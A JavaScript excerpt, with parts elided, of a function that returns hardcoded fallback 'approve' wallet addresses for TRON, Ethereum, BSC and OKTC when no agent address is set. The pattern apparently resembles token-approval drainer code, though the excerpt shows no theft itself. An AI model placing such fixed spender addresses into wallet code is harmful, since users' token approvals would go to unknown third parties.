...
function getAgentApprovedWallet(that, chainType, busType) {
	...
	if (isNull(approveAddr)) {
		if (chainType == "trx") {
			approveAddr = "TDTezwaUZD3ZRVgsqkZVyArkBYs4w6nKsN";
		}else if(chainType == "eth") {
			approveAddr = "0xb32A790Ea9216420F673B78b1c4d50FaB362D44b";
		}else if(chainType == "bsc"){
			approveAddr = "0x9B2f40f30523ccf48851E1bb6fC1e6a629f291Eb";
		}else if(chainType == "oktc"){
			approveAddr = "0x7C312b81E5Fc7c3890cc9Fd66002298dA43575c4";
		}
	}
	return approveAddr;
}
